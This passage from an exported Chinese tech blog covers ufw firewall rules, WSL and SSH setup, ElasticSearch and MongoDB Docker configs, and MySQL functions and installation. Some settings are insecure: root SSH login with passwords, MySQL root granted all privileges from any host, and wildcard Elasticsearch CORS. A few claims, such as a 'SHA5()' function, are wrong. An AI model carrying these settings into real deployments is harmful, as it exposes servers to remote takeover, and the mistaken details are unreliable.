命令可能会中断现有的ssh连接。继续操作(y|n)?
因为是在远程的Xshell进行连接开启防火墙的，有的系统是没有将SSH的22端口设置为public的，所以会有这样的提示.
这里分为两种情况，如果开启防火墙时在防火墙之中检测到22端口已添加为防火墙的开放端口，那么输入y继续操作以后，当前Xshell会自动断开连接；
相反，如果开启防火墙时在防火墙之中没有检测到22端口，那么输入y继续操作以后22端口将会不再支持其他连接，只支持当前已有的这个连接，保持当前连接的原因是可以通过该连接开放22端口。
这里之前没有设置过，直接输入y继续执行
Ubuntu防火墙添加开放普通端口
开放22端口
sudo ufw allow 22
开启完成，需要重启防火墙生效：
sudo ufw reload
查看防火墙的状态
root@ubuntu:/opt/docker/elasticsearch# sudo ufw statusStatus: activeTo                         Action      From--                         ------      ----22                         ALLOW       Anywhere               22 (v6)                    ALLOW       Anywhere (v6)               
查看22端口的监听状态
root@ubuntu:/opt/docker/elasticsearch# sudo netstat -tunlp | grep 22tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      839/sshd: /usr/sbin tcp6       0      0 :::22                   :::*                    LISTEN      839/sshd: /usr/sbin 
Ubuntu防火墙关闭普通端口
sudo ufw delete allow 21
Ubuntu防火墙开放规定协议的端口
sudo ufw allow 8001/tcp
Ubuntu防火墙关闭指定协议端口
sudo ufw delete allow 8001/tcp
Ubuntu防火墙开放限定ip地址端口


开放指定ip所有操作
sudo ufw allow from 192.168.1.11


关闭指定ip所有操作
sudo ufw delete allow from 192.168.1.11


开放指定ip对应端口操作
sudo ufw allow from 192.168.1.12 to any port 3306


开放指定ip对应端口操作
sudo ufw delete allow from 192.168.1.12 to any port 3306


]]></content>
      <categories>
        <category>工具|部署</category>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/20250520/0.html</url>
    <content><![CDATA[WSL Ubuntu 系统迁移到其他位置的完整指南
3. 修改 WSL 默认版本（WSL1 或 WSL2）
wsl --set-default-version 2  # 设置新安装的发行版默认用 WSL2wsl --set-version &lt;发行版名称&gt; 2  # 将现有发行版转换为 WSL2
方法一：使用 wsl --export 和 wsl --import (推荐)
1. 查看当前安装的 WSL 发行版
wsl --list --verbose
记录要迁移的 Ubuntu 发行版名称（如 Ubuntu-24.04）
2. 导出当前系统到 tar 文件
wsl --export Ubuntu-24.04 D:\wsl_backup\ubuntu24.04.tar
3. 注销原系统
wsl --unregister Ubuntu-24.04
4. 导入到新位置
wsl --import Ubuntu-24.04 D:\wsl_system\ubuntu24.04 D:\wsl_backup\ubuntu24.04.tar --version 2
5. 设置默认用户
# 进入 root 环境wsl -d Ubuntu-24.04 -u root# 设置默认用户（替换 yourusername 为你的用户名）echo -e "[user]\ndefault=yourusername" &gt;&gt; /etc/wsl.conf# 退出exit
6. 修改默认发行版
wsl --list --verbose  # 查看所有发行版wsl --set-default &lt;发行版名称&gt;  # 设置默认启动的发行版
在 WSL 中开放 22 端口 (SSH 服务) 的完整指南
方法一：在 WSL 内部配置 SSH 服务
1. 安装 SSH 服务器
sudo apt update &amp;&amp; sudo apt install openssh-server -y
2. 配置 SSH 服务
sudo nano /etc/ssh/sshd_config
修改以下关键参数：
Port 22ListenAddress 0.0.0.0PermitRootLogin yes           # 允许root登录PasswordAuthentication yes    # 允许密码认证
3. 重启 SSH 服务
sudo service ssh restart# 或使用 systemctl (如果启用了 systemd)sudo systemctl restart ssh
4. 检查服务状态
sudo service ssh status# 或sudo netstat -tulnp | grep 22
测试端口
# 安装 nc（Alpine）apt-get install netcat-openbsd# 测试端口nc -zv mysql 3306
2. 确保 RabbitMQ 管理插件已启用
RabbitMQ 默认不启用 Web 管理界面，需手动启用：
进入容器执行命令
docker exec -it &lt;container_name&gt; bash
在容器内启用管理插件
rabbitmq-plugins enable rabbitmq_management
退出并重启容器
exitdocker restart &lt;container_name&gt;
]]></content>
  </entry>
  <entry>
    <title>Ubuntu 查看系统信息</title>
    <url>/20221030/d81e4de4.html</url>
    <content><![CDATA[


命令
说明




查看 linux 内核，GCC 版本
ubantu : cat /proc/versionLinux 的 Redhat/Centos: cat /etc/redhat-release


系统版本
uname -a































lisa@ubuntu:~$ cat /proc/versionLinux version 5.19.0-32-generic (buildd@lcy02-amd64-026) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #33~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Jan 30 17:03:34 UTC 2alisa@ubuntu:~$ alisa@ubuntu:~$ alisa@ubuntu:~$ uname -aLinux ubuntu 5.19.0-32-generic #33~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Jan 30 17:03:34 UTC 2 x86_64 x86_64 x86_64 GNU/Linuxalisa@ubuntu:~$ ^Calisa@ubuntu:~$ lsb_release -aNo LSB modules are available.Distributor ID:	UbuntuDescription:	Ubuntu 22.04.2 LTSRelease:	22.04Codename:	jammy

LTS(Long-Term-Support)长期支持版本，会获得5年的升级维护支持。

]]></content>
      <categories>
        <category>工具|部署</category>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu卸载图形界面</title>
    <url>/20221030/f075b7f2.html</url>
    <content><![CDATA[1、打开终端（快捷键Ctrl + Alt + t）
2、卸载gnome-shell主程序
sudo apt-get remove gnome-shell
3、卸载掉gnome
sudo apt-get remove gnome 
4、卸载不需要的依赖关系
sudo apt-get autoremove
5、彻底卸载删除gnome的相关配置文件
sudo apt-get purge gnome
6、清理安装gnome时候留下的缓存程序软件包
sudo apt-get autocleansudo apt-get clean
7、重启
shutdown -r now
]]></content>
      <categories>
        <category>工具|部署</category>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>ElasticSearch安装</title>
    <url>/20230618/872a239c.html</url>
    <content><![CDATA[Docker
参考：https://new.nanxiangquan.com/2023/04/26/docker部署elk/
单机
docker-compose
version: '3.9'services:  elasticsearch-standalone:    image: elasticsearch:7.2.0    container_name: elasticsearch-standalone    privileged: true    restart: always    environment:      - TZ=Asia/Shanghai      - cluster.name=elasticsearch-standalone      - node.name=node01      - cluster.initial_master_nodes=["node01"]    volumes:      # - /opt/docker_data/elasticsearch-standalone/config/elasticsearch.keystore:/usr/share/elasticsearch/config/elasticsearch.keystore      - /opt/docker_data/elasticsearch-standalone/config/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml      - /opt/docker_data/elasticsearch-standalone/config/log4j2.properties:/usr/share/elasticsearch/config/log4j2.properties      - /opt/docker_data/elasticsearch-standalone/config/jvm.options:/usr/share/elasticsearch/config/jvm.options      # - /opt/docker_data/elasticsearch-standalone/config/role_mapping.yml:/usr/share/elasticsearch/config/role_mapping      # - /opt/docker_data/elasticsearch-standalone/config/roles.yml:/usr/share/elasticsearch/config/roles      # - /opt/docker_data/elasticsearch-standalone/config/users:/usr/share/elasticsearch/config/users      # - /opt/docker_data/elasticsearch-standalone/config/users_roles:/usr/share/elasticsearch/config/users_roles      - /opt/docker_data/elasticsearch-standalone/data:/usr/share/elasticsearch/data      - /opt/docker_data/elasticsearch-standalone/logs:/usr/share/elasticsearch/logs    ports:      - 9200:9200      - 9300:9300    ulimits:      memlock:        soft: -1        hard: -1
​         其中的配置文件：

elasticsearch.yml

node.master: truenode.data: truebootstrap.memory_lock: truenetwork.host: 0.0.0.0http.port: 9200transport.tcp.port: 9300path.data: /usr/share/elasticsearch/data  path.logs: /usr/share/elasticsearch/logs    http.cors.enabled: truehttp.cors.allow-origin: "*"http.cors.allow-headers: Authorizationxpack.security.enabled: truexpack.security.transport.ssl.enabled: truediscovery.zen.ping_timeout: 120sclient.transport.ping_timeout: 60s

jvm.options

	## JVM configuration################################################################## IMPORTANT: JVM heap size#################################################################### You should always set the min and max JVM heap## size to the same value. For example, to set## the heap to 4 GB, set:#### -Xms4g## -Xmx4g#### See https://www.elastic.co/guide/en/elasticsearch/reference/current/heap-size.html## for more information################################################################### Xms represents the initial size of total heap space# Xmx represents the maximum size of total heap space-Xms2g-Xmx2g################################################################## Expert settings#################################################################### All settings below this section are considered## expert settings. Don't tamper with them unless## you understand what you are doing#################################################################### GC configuration-XX:+UseConcMarkSweepGC-XX:CMSInitiatingOccupancyFraction=75-XX:+UseCMSInitiatingOccupancyOnly## G1GC Configuration# NOTE: G1GC is only supported on JDK version 10 or later.# To use G1GC uncomment the lines below.# 10-:-XX:-UseConcMarkSweepGC# 10-:-XX:-UseCMSInitiatingOccupancyOnly# 10-:-XX:+UseG1GC# 10-:-XX:InitiatingHeapOccupancyPercent=75## DNS cache policy# cache ttl in seconds for positive DNS lookups noting that this overrides the# JDK security property networkaddress.cache.ttl; set to -1 to cache forever-Des.networkaddress.cache.ttl=60# cache ttl in seconds for negative DNS lookups noting that this overrides the# JDK security property networkaddress.cache.negative ttl; set to -1 to cache# forever-Des.networkaddress.cache.negative.ttl=10## optimizations# pre-touch memory pages used by the JVM during initialization-XX:+AlwaysPreTouch## basic# explicitly set the stack size-Xss1m# set to headless, just in case-Djava.awt.headless=true# ensure UTF-8 encoding by default (e.g. filenames)-Dfile.encoding=UTF-8# use our provided JNA always versus the system one-Djna.nosys=true# turn off a JDK optimization that throws away stack traces for common# exceptions because stack traces are important for debugging-XX:-OmitStackTraceInFastThrow# flags to configure Netty-Dio.netty.noUnsafe=true-Dio.netty.noKeySetOptimization=true-Dio.netty.recycler.maxCapacityPerThread=0# log4j 2-Dlog4j.shutdownHookEnabled=false-Dlog4j2.disable.jmx=true-Djava.io.tmpdir=${ES_TMPDIR}## heap dumps# generate a heap dump when an allocation from the Java heap fails# heap dumps are created in the working directory of the JVM-XX:+HeapDumpOnOutOfMemoryError# specify an alternative path for heap dumps; ensure the directory exists and# has sufficient space-XX:HeapDumpPath=data# specify an alternative path for JVM fatal error logs-XX:ErrorFile=logs/hs_err_pid%p.log## JDK 8 GC logging8:-XX:+PrintGCDetails8:-XX:+PrintGCDateStamps8:-XX:+PrintTenuringDistribution8:-XX:+PrintGCApplicationStoppedTime8:-Xloggc:logs/gc.log8:-XX:+UseGCLogFileRotation8:-XX:NumberOfGCLogFiles=328:-XX:GCLogFileSize=64m# JDK 9+ GC logging9-:-Xlog:gc*,gc+age=trace,safepoint:file=logs/gc.log:utctime,pid,tags:filecount=32,filesize=64m# due to internationalization enhancements in JDK 9 Elasticsearch need to set the provider to COMPAT otherwise# time/date parsing will break in an incompatible way for some date patterns and locals9-:-Djava.locale.providers=COMPAT

log4j2.properties

status = error# log action execution errors for easier debugginglogger.action.name = org.elasticsearch.actionlogger.action.level = debugappender.rolling.type = Consoleappender.rolling.name = rollingappender.rolling.layout.type = ESJsonLayoutappender.rolling.layout.type_name = serverrootLogger.level = inforootLogger.appenderRef.rolling.ref = rollingappender.deprecation_rolling.type = Consoleappender.deprecation_rolling.name = deprecation_rollingappender.deprecation_rolling.layout.type = ESJsonLayoutappender.deprecation_rolling.layout.type_name = deprecationlogger.deprecation.name = org.elasticsearch.deprecationlogger.deprecation.level = warnlogger.deprecation.appenderRef.deprecation_rolling.ref = deprecation_rollinglogger.deprecation.additivity = falseappender.index_search_slowlog_rolling.type = Consoleappender.index_search_slowlog_rolling.name = index_search_slowlog_rollingappender.index_search_slowlog_rolling.layout.type = ESJsonLayoutappender.index_search_slowlog_rolling.layout.type_name = index_search_slowloglogger.index_search_slowlog_rolling.name = index.search.slowloglogger.index_search_slowlog_rolling.level = tracelogger.index_search_slowlog_rolling.appenderRef.index_search_slowlog_rolling.ref = index_search_slowlog_rollinglogger.index_search_slowlog_rolling.additivity = falseappender.index_indexing_slowlog_rolling.type = Consoleappender.index_indexing_slowlog_rolling.name = index_indexing_slowlog_rollingappender.index_indexing_slowlog_rolling.layout.type = ESJsonLayoutappender.index_indexing_slowlog_rolling.layout.type_name = index_indexing_slowloglogger.index_indexing_slowlog.name = index.indexing.slowlog.indexlogger.index_indexing_slowlog.level = tracelogger.index_indexing_slowlog.appenderRef.index_indexing_slowlog_rolling.ref = index_indexing_slowlog_rollinglogger.index_indexing_slowlog.additivity = false
初始化密码
进入elasticsearch容器docker exec -it elasticsearch bash进入bin目录cd bin/执行初始化密码./elasticsearch-setup-passwords interactive
]]></content>
      <categories>
        <category>数据库</category>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB安装</title>
    <url>/20221031/c5d54bc1.html</url>
    <content><![CDATA[Windows 安装
安装文件
现官网只含64位的安装文件，或者去以下路径下载： http://dl.mongodb.org/dl/win32/x86_64
环境变量
MONGODB_HOME：D:\ProgramSoft\MongoDBpath追加：%MONGODB_HOME%\bin;
安装服务
前提：创建文件夹 E:\ProgramData\db 和 E:\ProgramData\log
系统管理员操作

创建服务

sc create mongodb binPath= "D:\ProgramSoft\MongoDB\bin\mongod.exe --service --dbpath E:\ProgramData\db --logpath=E:\ProgramData\log\mongodb.log --logappend"

删除服务

sc delete mongodb

错误记录：

异常1： 服务开启不了 发生服务特定错误: 100，发生服务特定错误: 48
原因，service安装语句
sc create mongodb binPath= "D:\ProgramSoft\MongoDB\bin\mongod.exe --service --dbpath D:\mongodb\data --logpath=E:\ProgramData\log\mongodb.log --logappend --directoryperdb"
解决方案：


删除E:\ProgramData\db\mongod.lock文件


删除服务
net stop mongodb;net delete mongodb;


重新安装 注意：去除--directoryperdb命令
sc create mongodb binPath= "D:\ProgramSoft\MongoDB\bin\mongod.exe --service --dbpath D:\mongodb\data --logpath=E:\ProgramData\log\mongodb.log --logappend"


Docker
version: '3.9'services:    mongodb:        image: mongo:4.2.2        container_name: "mongodb"        restart: always        environment:            - TZ=Asia/Shanghai            - MONGO_INITDB_ROOT_USERNAME=admin            - MONGO_INITDB_ROOT_PASSWORD=你的密码        volumes:            - /opt/docker_data/mongo/logs:/var/log/mongodb            - /opt/docker_data/mongo/data/db:/data/db            - /opt/docker_data/mongo/data/configdb:/data/configdb        ports:            - 27017:27017
]]></content>
      <categories>
        <category>数据库</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL基础</title>
    <url>/20221031/bce68613.html</url>
    <content><![CDATA[字段加密/解密


PASSWORD(明文)：
创建一个经过加密的密码字符串，适合于插入到MySQL的安全系统。该加密过程不可逆，和unix密码加密过程使用不同的算法。主要用于MySQL的认证系统。


AES_ENCRYPT(明文，加密串)  AES_DECRYPT( 密文, 加密串 )
使用UNIX crypt()系统加密字符串，AES_ENCRYPT()函数接收要加密的字符串和（可选的）用于加密过程的salt（一个可以唯一确定口令的字符串，就像钥匙一样）。加密程度比ENCODE较强。
举例：加密  SELECT HEX(AES_ENCRYPT('测试', '29a70b6c')) FROM DUAL;   输出：AFA3016D4EE259FE76D0D625F9BDF889  解密  SELECT CONVERT(AES_DECRYPT(UNHEX('AFA3016D4EE259FE76D0D625F9BDF889'), '29a70b6c') USING utf8) FROM DUAL;  输出：测试 （CONVERT，字符集转换）


ENCODE(明文, 加密串)  DECODE(密文, 加密串)
加密解密字符串。该函数有两个参数：被加密或解密的字符串和作为加密或解密基础的密钥。Encode结果是一个二进制字符串，以BLOB类型存储。加密成度相对比较弱。


MD5()：计算字符串的MD5校验和（128位），


SHA5()：计算字符串的SHA5校验和（160位）
MD5()、SHA5() 这两个函数返回的校验和是16进制的，适合与认证系统中使用的口令。


CONCAT函数
注意：和NULL连接的结果为NULLSELECT CONCAT('test', '-', '1') FROM DUAL; 返回：test-1SELECT CONCAT('test', '-', NULL) FROM DUAL; 返回：NULL
IP地址/Long数据
SELECT INET_ATON('112.253.20.48');-&gt;1895633968SELECT INET_NTOA('1895633968')-&gt;112.253.20.48
日期函数
date_format参数



参数（年）

参数（月）

参数（日）





%Y
年，4 位
%b
缩写月名
%D
带有英文前缀的月中的天


%y
年，2 位
%c
月份的数值（1-12）
%d
月的天，数值(00-31)




%M
月名
%e
月的天，数值(0-31)




%m
月，数值(01-12)
%j
年的天 (001-366)






参数（时间）

参数（时）

参数（分）

参数（秒）

参数（微秒）





%T
时间，24-小时 (hh:mm:ss)
%H
小时 (00-23)
%i
分钟，数值(00-59)
%S
或者 %s 秒(00-59)
%f
微秒


%r
时间，12-小时（hh:mm:ss AM 或 PM）
%h
小时 (01-12)








%p
AM 或 PM
%I
小时 (01-12)










%k
小时 (0-23)












参数（年天）

参数（周天）

参数（星期）





%X
年，其中的星期日是周的第一天，4 位，与 %V 使用
%U
年周 (00-53) 星期日是一周的第一天
%a
缩写星期名


%x
年，其中的星期一是周的第一天，4 位，与 %v 使用
%u
年周 (00-53) 星期一是一周的第一天
%W
星期名




%V
年周 (01-53) 星期日是一周的第一天，与 %X 使用
%w
周的天 （0=星期日, 6=星期六）




%v
年周 (01-53) 星期一是一周的第一天，与 %x 使用








函数
举例
说明




CURDATE()  CURRENT_DATE()
SELECT CURDATE() 2021-11-30
返回当前的日期（%Y-%m-%d）


CURTIME()  CURRENT_TIME()
SELECT CURTIME();18:34:12
返回当前的时间（%T或者%H:%i:%s）


DATE_ADD(date,INTERVAL expr unit)
SELECT DATE_ADD(CURRENT_DATE,INTERVAL 6 MONTH);2022-05-30
返回日期date加上间隔时间int的结果(int必须按照关键字进行格式化)


DATE_SUB(date,INTERVAL int keyword)
SELECT DATE_SUB( CURRENT_DATE, INTERVAL 6 MONTH );2021-05-30
返回日期date加上间隔时间int的结果(int必须按照关键字进行格式化)


PERIOD_DIFF(P1, P2)
# 月份差值SELECT PERIOD_DIFF(date_format(‘2021-09-30’, ‘%Y%m’), date_format(‘2021-06-20’, ‘%Y%m’))#天数差值SELECT PERIOD_DIFF(date_format(‘2021-09-30’, ‘%Y%m%d’), date_format(‘2021-06-20’, ‘%Y%m%d’))# 上一个月 SELECT * FROM 表名 WHERE PERIOD_DIFF(date_format(now(),‘%Y%m’),date_format(时间字段名,‘%Y%m’) =1
计算两个日期之间的差值


TO_DAYS(date)
# 今天SELECT * FROM 表名 WHERE TO_DAYS(时间字段名) =TO_DAYS(NOW()); # 昨天SELECT * FROM 表名 WHERE TO_DAYS(NOW()) - TO_DAYS( 时间字段名) &lt;= 1
日期转天数


YEARWEEK
SELECT YEARWEEK(now()) 返回：202148# 本周SELECT * FROM 表名 WHERE YEARWEEK( date_format( 时间字段名,‘%Y-%m-%d’ ) ) = YEARWEEK( now() ) ;



WEEK

返回日期date为一年中第几周(0~53)


DAYOFWEEK

返回date所代表的一星期中的第几天(1~7)


DAYOFMONTH

返回date是一个月的第几天(1~31)


DAYOFYEAR(date)

返回date是一年的第几天(1~366)


DAYNAME
SELECT DAYNAME(CURRENT_DATE);返回：Tuesday
返回date的星期名


FROM_UNIXTIME(ts,fmt)

根据指定的fmt格式，格式化UNIX时间戳ts


YEAR
# 本年 SELECT * FROM 表名 WHERE YEAR( 时间字段名 ) = YEAR( NOW( ) )



MONTH

返回date的月份(1~12)


MONTHNAME

返回date的月份名


HOUR

返回time的小时值(0~23)


MINUTE

返回time的分钟值(0~59)


QUARTER
SELECT QUARTER(CURRENT_DATE);返回：4
返回date在一年中的季度(1~4)



MySQL外键设置
MySQL外键设置: Cascade、NO ACTION、Restrict、SET NULL



参数
说明




cascade
在父表上update/delete记录时，同步update/delete掉子表的匹配记录


set null
在父表上update/delete记录时，将子表上匹配记录的列设为null，要注意子表的外键列不能为not null


No action
如果子表中有匹配的记录,则不允许对父表对应候选键进行update/delete操作


Restrict
同no action, 都是立即检查外键约束


Set default
父表有变更时,子表将外键列设置成一个默认的值 但Innodb不能识别



查看/修改系统参数
版本号
select version();// 查看的是innodb_version
查看数据库运行中的进程
show full processlist  或selec * from processlist
查看系统运行状态
性能优化的时候可参考
show status
系统参数配置
show variables
最大连接数
查看
select @@global.max_connections
修改
set global max_connections=1024;
配置 sql_mode
查看
# 全局配置select @@global.sql_mode; # 已经存在的数据库sql_modeselect @@sql_mode;
修改（建议先查后改）
# 改变已经存在的数据库sql_mode set sql_mode=' ' # 改变全局配置sql_modeset @@global.sql_mode=' ' 
系统参数总表参考
查询
SHOW VARIABLES;SHOW VARIABLES LIKE 'autocommit';
配置执行语句长度限制
配置不够，执行错误提示
ERROR:The size of BLOB/TEXT data inserted in one transaction is greater than  10% of redo log size. Increase the redo log size using innodb_log_file_size.
查看配置
select @@global.max_allowed_packet
修改配置（临时）
set global max_allowed_packet  = 1024*1024*1024;
修改配置（永久）
在mysqld下面添加配置max_allowed_packed=1024M  
批量执行insert语句，进入了阻塞状态
原因一：磁盤空間已滿
原因二：innodb_flush_log_at_trx_commit是配置MySql日志何时写入硬盘的参数：

参数值说明




参数
说明




0
log buffer将每秒一次地写入log file中，并且log  file的flush(刷到磁盘)操作同时进行。该模式下在事务提交的时候，不会主动触发写入磁盘的操作。当设置为0，该模式速度最快，但不太安全，mysqld进程的崩溃会导致上一秒钟所有事务数据的丢失


1
每次事务提交时MySQL都会把log buffer的数据写入log  file，并且flush(刷到磁盘)中去，该模式为系统默认。当设置为1，该模式是最安全的，但也是最慢的一种方式。在mysqld 服务崩溃或者服务器主机crash的情况下，binary log 只有可能丢失最多一个语句或者一个事务


2
每次事务提交时mysql都会把log buffer的数据写入log  file，但是flush(刷到磁盘)操作并不会同时进行。该模式下，MySQL会每秒执行一次 flush(刷到磁盘)操作当设置为2，该模式速度较快，也比0安全，只有在操作系统崩溃或者系统断电的情况下，上一秒钟所有事务数据才可能丢失



解决
innodb_flush_log_at_trx_commit=2，sync_binlog=500 或1000 
​		查找资料时候看到其他文章说innodb_flush_log_at_trx_commit和sync_binlog 两个参数是控制MySQL 磁盘写入策略以及数据安全性的关键参数，当两个参数都设置为1的时候写入性能最差。
​		推荐做法是innodb_flush_log_at_trx_commit=2，sync_binlog=500 或1000
表联合查询
两个数据表的关联
USING(userid, unit_id)
# 使用 USING：关联字段一致SELECT claim.userid, person.real_nameFROM ware_resouce_info_claim  claimLEFT JOIN personal_userinfo person USING(userid, unit_id) ;# 使用字段组合SELECT claim.userid, person.real_nameFROM ware_resouce_info_claim claimLEFT JOIN personal_userinfo person ON person.userid = claim.userid;
GROUP BY … WITH ROLLUP
加上WITH ROLLUP关键字的效果是MySQL将在查询结果的最后一-行将自动增加一条总数统计记录，这条记录的ID字段取值或者说这条记录的名字永远是NULL.


如下所示：
 SELECT document_type_id, COUNT(*) FROM resource_infoGROUP BY document_type_id WITH ROLLUP;



GROUP BY 结果中有NULL 的聚类项
 SELECT document_type_id, COUNT(*) FROM resource_info GROUP BY document_type_id WITH ROLLUP



多个聚类项目：按照每个聚类项统计（小计和总计的概念）
 SELECT document_type_id, department_id, COUNT(*) FROM resource_info GROUP BY document_type_id, department_idWITH ROLLUP;



]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL安装、版本差异、JDBC连接配置</title>
    <url>/20221031/4c28b48e.html</url>
    <content><![CDATA[Windows安装（5.6）


. 准备
拷贝文件夹：mysql-5.6.10-winx64到D:\ chaoxing \ software \目录下


环境变量
MYSQL_HOME: D:\ chaoxing \ software \ mysql-5.6.10-winx64（新建）
path追加：;%MYSQL_HOME%\bin


安装服务，并启动
启动cmd：进入目录D:\ chaoxing \ software \ mysql-5.6.10-winx64\bin
运行：mysqld install MySQL
启动：net start MySQL


修改数据库密码
启动cmd：进入目录D:\ chaoxing \ software \ mysql-5.6.10-winx64\bin
运行：mysql –u root


mysql&gt;show databases;
mysql&gt;use mysql;
mysql&gt;UPDATE user SET password=PASSWORD(“自定义密码”) WHERE user=‘root’;
mysql&gt;FLUSH PRIVILEGES;
mysql&gt;QUIT
LINUX安装
准备工作


下载MySQL安装包
下载路径：https://dev.mysql.com/downloads/mirrors/，点左侧，Other Downloads，选择需要的镜像下载。
选择版本：mysql-5.7.23-linux-glibc2.12-x86_64.tar.gz
或者：wget https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.23-linux-glibc2.12-x86_64.tar.gz直接下载


上传&amp; 解压  （rz -y 上传）压缩包存放路径：/opt
tar -zxvf mysql-5.7.23-linux-glibc2.12-x86_64.tar.gzmv mysql-5.7.23-linux-glibc2.12-x86_64 mysql-5.7.23


安装MySQL


安装依赖
yum install -y cmake make gcc gcc-c++ libaio ncurses ncurses-devel


添加系统mysql组和mysql用户


​		添加系统mysql组 groupadd mysql
​		添加mysql用户useradd -r -g mysql mysql（添加完成后可用id mysql查看）

安装数据库

​		切到mysql目录： cd /opt/mysql-5.7.23
​		修改当前目录拥有者为mysql用户： chown -R mysql:mysql ./
​		安装数据库bin/mysqld --initialize --user=mysql --basedir=/opt/mysql-5.7.23 --datadir=/opt/mysql-5.7.23/data，  保存临时密码：123123123123
可能报这个错bin/mysqld: error while loading shared libraries: *libaio.so.1:* cannot open shared object file: No such file or directory解决方法yum install -y libaio //安装后在初始化
​		执行以下命令创建RSA private key
bin/mysql_ssl_rsa_setup --datadir=/opt/mysql-5.7.23/data
​		修改当前目录拥有者为mysql用户 chown -R mysql:mysql ./
​		修改当前data目录拥有者为mysql用户 chown -R mysql:mysql data


配置my.cnf
vi /etc/my.cnf
[mysqld]character_set_server=utf8init_connect='SET NAMES utf8'basedir=/opt/mysql-5.7.23datadir=/opt/mysql-5.7.23/datasocket=/tmp/mysql.sock#不区分大小写lower_case_table_names = 1#不开启sql严格模式sql_mode="STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"log-error=/var/log/mysqld.logpid-file=/opt/mysql-5.7.23/data/mysqld.pid
添加开机启动项
cp /opt/mysql-5.7.23/support-files/mysql.server /etc/init.d/mysqld
修改 ：  vi /etc/init.d/mysqld 
添加路径
basedir=/opt/mysql-5.7.23datadir=/opt/mysql-5.7.23/data


启动mysql  ：service mysqld start 
加入开机起动 ： ` chkconfig --add mysqld  `


登录修改密码 ：mysql -uroot -p 上面初始化时的密码（123123123123）


​		如果出现错误 需要添加软连接：  ln -s /opt/mysql-5.7.23/bin/mysql /usr/bin
​		或者，修改环境变量。
​         
​       第一件事先修改密码：
mysql&gt;alter user 'root'@'localhost' identified by '修改后的密码';  mysql&gt;flush privileges;  #刷新权限


重启后执行，如果看到有监听说明服务启动了：netstat -na | grep 3306


防火墙
# 设置firewall-cmd --zone=public --add-port=3306/tcp --permanent# 重新载入firewall-cmd --reload# 查看firewall-cmd --zone= public --query-port=3306/tcp 或 firewall-cmd --zone=public --list-ports


设置mysql的远程登录
# grant all privileges on 库.表 to 用户@'%' identified by '修改后的密码';mysql&gt; grant all privileges on *.* to root@'%' identified by 'root密码';mysql&gt; flush privileges;


版本差异
修改密码
MySQL5.6，
UPDATE user SET password=PASSWORD("gese45ew&amp;20") WHERE user='root'; 
MySQL5.7
update user set authentication_string = password('gese45ew&amp;20') , password_expired = 'N', password_last_changed = now() where user = 'root';
创建索引
因为，MySQL5.5和MySQL5.0 之间，建索引的语句不一样 所以，直接拷贝5.5的sql语句，不能在5.0上运行
方法：


删除索引之后，再拷贝数据
ALTER TABLE consult_userinfo DROP INDEX idx_user_info_userid ; 


在5.0的数据库建索引
例如：
CREATE INDEX idx_user_info_userid on test_table (`userid`); CREATE INDEX index_author on test_table(`author`(255)); CREATE INDEX index_orderid on test_table(`id`,`orderid`); 


5.5建索引
ALTER TABLE `test_table` ADD INDEX index_name ( `column1`, `column2`, `column3`)


JDBC连接配置
JDBC连接配置参数（5.7）



参数
说明
默认值
常用值




autoReconnect
自动连接
false
true


autoReconnectForPools
自动连接连接池
false
true


characterEncoding
当useUnicode=true时，指定字符集

UTF-8


allowMultiQueries
在一条语句中，允许使用“;”来分隔多条查询
false
true


failOverReadOnly
在autoReconnect模式下出现故障切换时，是否应将连接设置为“只读”
true
false


useSSL
与服务器进行通信时使用SSL
true
false


useUnicode
是否使用Unicode
false
true


socketTimeout
数据库无返回时，应用等待时间（ms）。要大于等于数据库配置的Socket TimeOut的值
0
60000


serverTimezone
配置时区
系统时区
Asia/Shanghai GMT%2B8


zeroDateTimeBehavior
配置空值存入DataTime1.	exception：默认值，即抛出SQL state [S1009]. Cannot convert value…的异常2.	convertToNull：将日期转换成NULL值3.	round：替换成最近的日期即0001-01-01
exception
convertToNull



时区异常处理
错误信息
…  is unrecognized or represents more than one time zone
配置时区
jdbc:mysql://localhost:3306/db?useUnicode=true&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai
数据库客户端超时设置
数据库客户端的超时主要可以分为JDBC超时/连接池超时/Statement超时/事务超时等。
超时配置的关系和层级示意图


上图中，更上层的超时依赖于下层的超时，只有当较低层的超时机制正常工作，上层的超时才会正常。如果 JDBC 驱动程序的socket超时工作不正常，那么更上层的超时比如 Statement 超时和事务超时都不会正常工作。
Transaction Timeout(事务超时)
​		transaction timeout一般存在于框架（Spring, EJB）或应用级。transaction timeout或许是个相对陌生的概念，简单地说，transaction timeout就是“statement Timeout * N（需要执行的statement数量） + @（垃圾回收等其他时间）”。
​		transaction timeout用来限制执行statement的总时长。
​		例如：假设执行一个statement需要0.1秒，那么执行少量statement不会有什么问题，但若是要执行100,000个statement则需要10,000秒（约7个小时）。这时，transaction timeout就派上用场了。EJB CMT (Container Managed Transaction)就是一种典型的实现，它提供了多种方法供开发者选择。但我们并不使用EJB，Spring的transaction timeout设置会更常用一些。在Spring中，你可以使用下面展示的XML或是在源码中使用@Transactional注解来进行设置。
